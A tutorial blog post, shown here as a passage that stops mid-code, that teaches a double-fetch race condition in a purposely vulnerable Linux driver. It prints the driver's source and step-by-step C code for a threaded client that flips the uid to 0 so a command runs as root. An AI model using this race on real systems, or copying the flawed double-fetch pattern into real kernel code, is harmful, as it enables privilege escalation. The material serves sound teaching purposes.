<!DOCTYPE html>
<html lang="en">
<a rel="me" href="https://infosec.exchange/@pwningsystems" hidden></a>
<script data-goatcounter="https://pwningsystems.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
<head>
  
    <title>An introduction to Kernel Exploitation Part 1 :: pwning.systems</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="I&amp;rsquo;m writing this post because I often hear that kernel exploitation is intimidating or difficult to learn. As a result, I&amp;rsquo;ve decided to start a series of basic bugs and exercises to get you started!
Prerequisites
 Knowledge of the Linux command line Knowing how to read and write basic C may be beneficial Being able to debug with the help of a virtual computer or another system Able to install the kernel module compilation build requirements A basic understanding of the difference between userland and kernelland could be helpful Having a basic understanding of assembly can be beneficial for future episodes  For this part, I wrote a simple Linux character device, /dev/shell." />
<meta name="keywords" content="kernel, exploitation, racecondition" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://pwning.systems/posts/an-introduction-to-kernel-exploitation-part1/" />




<link rel="stylesheet" href="https://pwning.systems/assets/style.css">

  <link rel="stylesheet" href="https://pwning.systems/assets/green.css">






<link rel="apple-touch-icon" href="https://pwning.systems/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://pwning.systems/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="https://pwning.systems/" />
  
    <meta name="twitter:creator" content="pwningsystems" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="An introduction to Kernel Exploitation Part 1">
<meta property="og:description" content="I&amp;rsquo;m writing this post because I often hear that kernel exploitation is intimidating or difficult to learn. As a result, I&amp;rsquo;ve decided to start a series of basic bugs and exercises to get you started!
Prerequisites
 Knowledge of the Linux command line Knowing how to read and write basic C may be beneficial Being able to debug with the help of a virtual computer or another system Able to install the kernel module compilation build requirements A basic understanding of the difference between userland and kernelland could be helpful Having a basic understanding of assembly can be beneficial for future episodes  For this part, I wrote a simple Linux character device, /dev/shell." />
<meta property="og:url" content="https://pwning.systems/posts/an-introduction-to-kernel-exploitation-part1/" />
<meta property="og:site_name" content="pwning.systems" />

  <meta property="og:image" content="https://pwning.systems/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-03-08 18:42:53 &#43;0100 CET" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    pwning.systems
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/bugs">Bugs</a></li>
        
      
        
          <li><a href="/links">Links</a></li>
        
      
        
          <li><a href="/index.xml">RSS</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/bugs">Bugs</a></li>
      
    
      
        <li><a href="/links">Links</a></li>
      
    
      
        <li><a href="/index.xml">RSS</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://pwning.systems/posts/an-introduction-to-kernel-exploitation-part1/">An introduction to Kernel Exploitation Part 1</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-03-08 
      </span>
    
    
    <span class="post-author">:: Jordy Zomer</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://pwning.systems/tags/kernel/">kernel</a>&nbsp;
    
    #<a href="https://pwning.systems/tags/exploitation/">exploitation</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <p>I&rsquo;m writing this post because I often hear that kernel exploitation is intimidating or difficult to learn.  As a result, I&rsquo;ve decided to start a series of basic bugs and exercises to get you started!</p>
<p><strong>Prerequisites</strong></p>
<ul>
<li>Knowledge of the Linux command line</li>
<li>Knowing how to read and write basic C may be beneficial</li>
<li>Being able to debug with the help of a virtual computer or another system</li>
<li>Able to install the kernel module compilation build requirements</li>
<li>A basic understanding of the difference between userland and kernelland could be helpful</li>
<li>Having a basic understanding of assembly can be beneficial for future episodes</li>
</ul>
<p>For this part, I wrote a simple <a href="https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver">Linux character device</a>, <code>/dev/shell</code>.  This driver will take two arguments, <code>uid</code> and <code>cmd</code>, and it will execute the <code>cmd</code> command as the specified <code>uid</code>. To understand how this driver works, I&rsquo;ll explain a few things!</p>
<p>When a device is registered in Linux, it takes a few parameters, the most important of which is <em>fops</em> (File Operations). The <em>fops</em> of a character device looks somewhat like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations query_fops <span style="color:#f92672">=</span> {
		.owner <span style="color:#f92672">=</span> THIS_MODULE,
		.open <span style="color:#f92672">=</span> shell_open,
		.release	<span style="color:#f92672">=</span> shell_close,
		.unlocked_ioctl <span style="color:#f92672">=</span> shell_ioctl
};
</code></pre></div><p>You can see that there are a few operations. <code>open</code> is the function that&rsquo;s being called when you open the device, the <code>release</code> function is being called when you close the device, and <code>unlocked_ioctl</code> is called when you make an IOCTL (Input / Output control) request to the device.  In userland these will look like:</p>
<p>Open:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);
</code></pre></div><p>Close:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">close(fd);
</code></pre></div><p>IOCTL:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">ioctl(fd, COMMAND, argument);
</code></pre></div><p>In this case, we will want to focus on the IOCTL request. The request takes a few arguments, these being:</p>
<p>The FD pointing to the device you just opened.
The command number.
The argument, this can either be an integer or a pointer to a data structure in userland.</p>
<p>In our case the function signature looks somewhat like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> shell_ioctl(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg)
</code></pre></div><p>Our IOCTL function takes a pointer to a data structure in userland as an argument. This argument is <code>struct user_data</code>, which is described in our code as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> user_data {
	<span style="color:#66d9ef">int</span>	uid;
	<span style="color:#66d9ef">char</span>	cmd[<span style="color:#ae81ff">100</span>];
} user_data;
</code></pre></div><p>This structure contains a user-id and a command to execute. This command has a maximum of 100 bytes. Our full ioctl handler looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">shell_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg)
{
	user_data udat;
	kuid_t kernel_uid <span style="color:#f92672">=</span> current_uid();

	memset(udat.cmd, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(udat.cmd));

	<span style="color:#66d9ef">if</span> (raw_copy_from_user(<span style="color:#f92672">&amp;</span>udat.uid, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg, <span style="color:#66d9ef">sizeof</span>(udat.uid)))
		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;

	printk(KERN_INFO <span style="color:#e6db74">&#34;CHECKING VALIDITY OF UID: %d&#34;</span>, udat.uid);

	<span style="color:#66d9ef">if</span> (udat.uid <span style="color:#f92672">==</span> kernel_uid.val) {
		<span style="color:#66d9ef">int</span> rc;
		<span style="color:#66d9ef">struct</span> subprocess_info <span style="color:#f92672">*</span>sub_info;

		printk(KERN_INFO <span style="color:#e6db74">&#34;UID: %d EQUALS %d&#34;</span>, udat.uid, kernel_uid.val);

		usleep_range(<span style="color:#ae81ff">1000000</span>, <span style="color:#ae81ff">1000001</span>);

		<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv <span style="color:#f92672">=</span> kmalloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>[<span style="color:#ae81ff">4</span>]), GFP_KERNEL);

		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>argv)
			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;

		memset(<span style="color:#f92672">&amp;</span>udat, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(udat));

		<span style="color:#66d9ef">if</span> (raw_copy_from_user(<span style="color:#f92672">&amp;</span>udat, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg, <span style="color:#66d9ef">sizeof</span>(udat)))
			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;

		real_uid <span style="color:#f92672">=</span> udat.uid;

		<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
			<span style="color:#e6db74">&#34;HOME=/&#34;</span>,
			<span style="color:#e6db74">&#34;TERM=linux&#34;</span>,
			<span style="color:#e6db74">&#34;PATH=/sbin:/usr/sbin:/bin:/usr/bin&#34;</span>,
			NULL
		};

		argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
		argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;-c&#34;</span>;
		argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> udat.cmd;
		argv[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> NULL; 

		printk(KERN_INFO <span style="color:#e6db74">&#34;CMD = %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">2</span>]);

		sub_info <span style="color:#f92672">=</span> call_usermodehelper_setup(argv[<span style="color:#ae81ff">0</span>], argv, envp, GFP_KERNEL, init_func, free_argv, NULL);

		<span style="color:#66d9ef">if</span> (sub_info <span style="color:#f92672">==</span> NULL) {
			kfree(argv);
			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
		}

		rc <span style="color:#f92672">=</span> call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);

		printk(KERN_INFO <span style="color:#e6db74">&#34;RC = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, rc);
		<span style="color:#66d9ef">return</span> rc;
	}

	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Let me explain what this does. At first it initializes some data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// Define our udat destination
</span><span style="color:#75715e"></span>user_data udat;
<span style="color:#75715e">// Get the current users UID
</span><span style="color:#75715e"></span>kuid_t kernel_uid <span style="color:#f92672">=</span> current_uid();

<span style="color:#75715e">// Zero out the structs CMD memory just to be sure.
</span><span style="color:#75715e"></span>memset(udat.cmd, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(udat.cmd)); 
	 
</code></pre></div><p>Once this is done, we will fetch some data from userspace and compare the uid the user sent us with the uid we got.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// Copy the uid part of the user_dat struct to kernel memory from userland.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (raw_copy_from_user(<span style="color:#f92672">&amp;</span>udat.uid, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg, <span style="color:#66d9ef">sizeof</span>(udat.uid)))
	 <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;

<span style="color:#75715e">// Is the UID we supplied the same as the UID that calls this ioctl.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (udat.uid <span style="color:#f92672">==</span> kernel_uid.val) {
	<span style="color:#75715e">// Next part
</span><span style="color:#75715e"></span>}
</code></pre></div><p>In the next part, if the uid matches, it will set up some variables, etc for the next stage!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"> <span style="color:#66d9ef">int</span> rc;
 <span style="color:#66d9ef">struct</span> subprocess_info <span style="color:#f92672">*</span>sub_info;
 
 printk(KERN_INFO <span style="color:#e6db74">&#34;UID: %d EQUALS %d&#34;</span>, udat.uid, kernel_uid.val);
 
 usleep_range(<span style="color:#ae81ff">1000000</span>, <span style="color:#ae81ff">1000001</span>);
 <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv <span style="color:#f92672">=</span> kmalloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>[<span style="color:#ae81ff">4</span>]), GFP_KERNEL);
 
 <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>argv)
	 <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
</code></pre></div><p>You can here see that it creates a buffer for the command, a return code, and a struct subprocess_info. There will be useful for later. After that, it will sleep (to make exploitation a bit easier, as we focus on explaining the purpose of the bug and not on mad exploits!). After that, we will allocate four arrays for the arguments of the commands that are executed. If the memory can&rsquo;t be allocated the driver will quit.</p>
<p>Once these data structures are initialized we will zero out the memory of <code>udat</code> and copy the entire structure from user-space:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"> memset(<span style="color:#f92672">&amp;</span>udat, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(udat));
 
 <span style="color:#66d9ef">if</span> (raw_copy_from_user(<span style="color:#f92672">&amp;</span>udat, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg, <span style="color:#66d9ef">sizeof</span>(udat)))
	 <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
 
 real_uid <span style="color:#f92672">=</span> udat.uid;
</code></pre></div><p>This is where the bug comes in! The bug in here is a race condition which we call in fancy words: Double Fetch!</p>
<p>In theory, a Double Fetch is a race condition weakness. Between kernel mode and user mode, there may be a data access rivalry. Virtual memory addresses are normally divided into kernelspace and userspace in modern operating systems like Linux and BSD variants.</p>
<p>Core kernel code, driver code, as well as other components with higher privileges, run in the kernelspace. The userspace executes user code and usually interacts with the kernel through system/IOCTL calls to carry out the necessary tasks. When userspace sends the data to the kernel, the kernel generally copies the data to kernelspace using a copy function like <code>copy_from_user()</code> for verification and relatability.</p>
<p>Common functions that copy memory from userspace to kernelspace are:</p>
<ul>
<li>copy_from_user (Linux)</li>
<li>__copy_from_user (Linux)</li>
<li>get_user (Linux)</li>
<li>copyin (BSD)</li>
<li>copyinstr (BSD)</li>
<li>Many many more!</li>
</ul>
<p>We could modify the data after it has been fetched for the first time by some of the functions that copy memory from userspace, which is the danger of this flaw. We might get around any checks that this data may have. There are size limits in certain situations, but we&rsquo;d like to adjust the uid after it has been verified in this case.</p>
<p>In theory, this would be the shell module&rsquo;s vulnerable code-path.</p>
<ul>
<li>Userspace uid is retrieved by the module</li>
<li>The module determines if the uid that is specified is the same as the uid of the calling user.</li>
<li>In our own userspace memory, we are continually changing the uid in a new thread</li>
<li>The module runs a command as the user to whom we just changed it (using <code>call_usermodehelper()</code>).</li>
</ul>
<blockquote>
<p><strong>Fun fact</strong>: The <code>call_usermodehelper()</code> functions are extremely useful for security researchers!
It is often used in rootkits or exploits to return to userland and execute commands with elevated privileges.</p>
</blockquote>
<p><strong>Your task? Write an exploit for the driver located at:</strong></p>
<p><a href="https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver">https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver</a></p>
<p>(My exploit is there for reference in episode1/client).</p>
<h3 id="spoiler-alert-discussing-my-exploit">SPOILER ALERT (Discussing my exploit):<a href="#spoiler-alert-discussing-my-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>We&rsquo;ve found the driver! Let&rsquo;s see if we can come up with an exploit for it. We&rsquo;ll begin by building the device so that it can be accesed from our client.</p>
<p>Run the following commands as root in the <code>episode1/driver/</code> directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ make <span style="color:#75715e"># This will compile the kernel module and give you the shell.ko file</span>
...
$ insmod shell.ko <span style="color:#75715e"># This will insert (load) our freshly compiled module</span>
...
$ chmod <span style="color:#ae81ff">777</span> /dev/shell <span style="color:#75715e"># We want the character device to be accesible by any user</span>

</code></pre></div><p>Let’s get to work on the client now that our driver is all set up! We start with a basic skeleton that includes everything we’ll need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
	<span style="color:#66d9ef">return</span> EXIT_SUCCESS;
}

</code></pre></div><p>This won&rsquo;t do much but return success once it&rsquo;s been compiled.</p>
<p>The first step is to open our device, which we can do using the <code>open</code> syscall.</p>
<p>The <code>open</code> syscall accepts two arguments: a <code>pathname</code> and some <code>flags</code>. We&rsquo;ll use our device as the <code>pathname</code> and <code>read + write</code> as the flags.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// O_RDWR stands for open it for both reading and writing.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);
</code></pre></div><p>Of course, once we&rsquo;ve opened our character device, we&rsquo;ll have to shut it again! This is what the <code>close</code> syscall would do!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{

	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);
	<span style="color:#75715e">//XXX: DO SOMETHING USEFUL HERE
</span><span style="color:#75715e"></span>	close(fd);
}
</code></pre></div><p>Now it&rsquo;s up to us to do something useful with it; we know our driver has an IOCTL handler that ignores the <code>cmd</code> but rather accepts a pointer to <code>struct user_data</code> as an argument!</p>
<p>Let&rsquo;s begin by including the <code>user_data</code> struct in our client and sending an IOCTL request! This will appear as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">// This defines the struct that we&#39;ll give as an argument to our IOCTL request.
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> user_data {
	<span style="color:#66d9ef">int</span>	uid;
	<span style="color:#66d9ef">char</span>	cmd[<span style="color:#ae81ff">100</span>];
}  user_data;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
	<span style="color:#75715e">// This creates an instance of the user_data structure called &#39;udat&#39;.
</span><span style="color:#75715e"></span>	user_data udat; 

	<span style="color:#75715e">// We&#39;ll initialize the data of the structure here!
</span><span style="color:#75715e"></span>
	<span style="color:#75715e">// our uid is the uid of my current user.
</span><span style="color:#75715e"></span>	udat.uid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>;

	<span style="color:#75715e">// Copy the string echo &#39;foo&#39; &gt; /tmp/hacker to our command as a test.
</span><span style="color:#75715e"></span>	strcpy(udat.cmd, <span style="color:#e6db74">&#34;echo &#39;foo&#39; &gt; /tmp/hacker&#34;</span>); 


	<span style="color:#75715e">// Open our driver
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);

	<span style="color:#75715e">// Make our actual IOCTL request with the data we just initialized. 
</span><span style="color:#75715e"></span>	ioctl(fd, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>udat);

	<span style="color:#75715e">// Close our driver again
</span><span style="color:#75715e"></span>	close(fd);

	<span style="color:#66d9ef">return</span> EXIT_SUCCESS;
}
</code></pre></div><p>Our simple client is now complete! This will literally run our command as our user!</p>
<p>Note that the above example does not perform any error checking; if you want that you&rsquo;ll have to do it yourself.</p>
<p>Now comes the actual exploitation of the bug, which will require us to win the race against the kernel module&rsquo;s uid verification.
We can do this by modifying our <code>uid</code> in another thread, which we can do with the <code>pthread</code> library.</p>
<p>Within pthread, a thread can be declared using the <code>pthread_t</code> data-type. Next to that we can use <code>pthread_create()</code> to start a new process.</p>
<blockquote>
<p><em>From the docs</em>: The pthread_create() function starts a new thread in the calling process.<br>
The new thread starts execution by invoking start_routine(); arg is passed as the sole argument of start_routine().</p>
</blockquote>
<p>Let&rsquo;s update our code to start a thread!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> user_data {
	<span style="color:#66d9ef">int</span>	uid;
	<span style="color:#66d9ef">char</span>	cmd[<span style="color:#ae81ff">100</span>];
}  user_data;


<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change_uid_root</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>struct_ptr)
{
	<span style="color:#75715e">// TODO: Add code to change the uid in our structure.
</span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;Hello from our thread!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
	<span style="color:#75715e">// Declare an instance of a thread
</span><span style="color:#75715e"></span>	pthread_t <span style="color:#66d9ef">thread</span>;

	user_data udat;

	udat.uid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>;

	strcpy(udat.cmd, <span style="color:#e6db74">&#34;echo &#39;foo&#39; &gt; /tmp/hacker&#34;</span>);

	<span style="color:#75715e">// Create a thread within our process that calls the change_uid_root() function
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// With our udat (user_data) structure as an argument.
</span><span style="color:#75715e"></span>	pthread_create(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span>, NULL, change_uid_root, <span style="color:#f92672">&amp;</span>udat);

	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);

	ioctl(fd, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>udat);


	<span style="color:#75715e">// Wait for our thread to stop
</span><span style="color:#75715e"></span>	pthread_join(<span style="color:#66d9ef">thread</span>, NULL);

	close(fd);

	<span style="color:#66d9ef">return</span> EXIT_SUCCESS;
}
</code></pre></div><p>This is a fantastic start. Obviously, the code isn&rsquo;t complete yet, but so far:</p>
<ul>
<li>We&rsquo;ve defined and initialized our <code>user_data</code> struct and built a simple client for our IOCTL handler.</li>
<li>Using the IOCTL request, we could <em>actually</em> run commands.</li>
<li>We&rsquo;ve made a thread that will <em>actually</em> print something!</li>
</ul>
<p>The next move is to modify the <code>change_uid_root()</code> function so that we can keep editing our <code>uid</code> while still sending <em>legitimate</em> IOCTL requests.
This way, we can try to beat the kernel to modify our uid after the verification is completed!</p>
<p>Let&rsquo;s get started with this step!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">
<span style="color:#75715e">// Add a bit of state tracking
</span><span style="color:#75715e">// So we can stop the thread when our for loop is done
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> finish <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> user_data {
	<span style="color:#66d9ef">int</span>	uid;
	<span style="color:#66d9ef">char</span>	cmd[<span style="color:#ae81ff">100</span>];
}  user_data;


<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">change_uid_root</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>struct_ptr)
{
	user_data <span style="color:#f92672">*</span>udat <span style="color:#f92672">=</span> struct_ptr;

	<span style="color:#75715e">// While we&#39;re not finished, keep trying to change the uid to 0 in this thread.	
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> (finish <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
		udat<span style="color:#f92672">-&gt;</span>uid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
}


<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
{
	pthread_t <span style="color:#66d9ef">thread</span>;

	user_data udat;

	udat.uid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>;

	strcpy(udat.cmd, <span style="color:#e6db74">&#34;echo &#39;foo&#39; &gt; /tmp/hacker&#34;</span>);

	pthread_create(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span>, NULL, change_uid_root, <span style="color:#f92672">&amp;</span>udat);

	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/shell&#34;</span>, O_RDWR);


	<span style="color:#75715e">// Try running 100 legitimate IOCTL requests
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// while our thread is trying to change the uid to 0
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// we keep resetting our uid 
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// to our initial value otherwise it will stay 0 after the thread
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; i<span style="color:#f92672">++</span>) {
		ioctl(fd, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>udat);
		udat.uid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>;
	}

	<span style="color:#75715e">// After our loop we should make our thread stop.
